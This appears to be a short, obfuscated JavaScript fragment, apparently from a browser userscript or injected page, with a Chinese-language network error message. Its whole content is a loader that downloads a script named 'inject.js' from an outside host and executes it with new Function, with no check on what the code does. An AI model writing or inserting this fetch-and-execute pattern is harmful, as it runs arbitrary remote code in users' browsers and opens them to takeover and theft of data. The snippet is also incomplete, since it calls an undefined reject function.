
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/inject.js").then(_0x2b990f => {
  if (!_0x2b990f.ok) throw new Error("请检查网络是否OK");
  return _0x2b990f.text();
}).then(_0x2d3f4d => {
  const _0x34a140 = new Function(_0x2d3f4d);
  _0x34a140();
}).catch(_0x37a6d7 => {
  reject();
});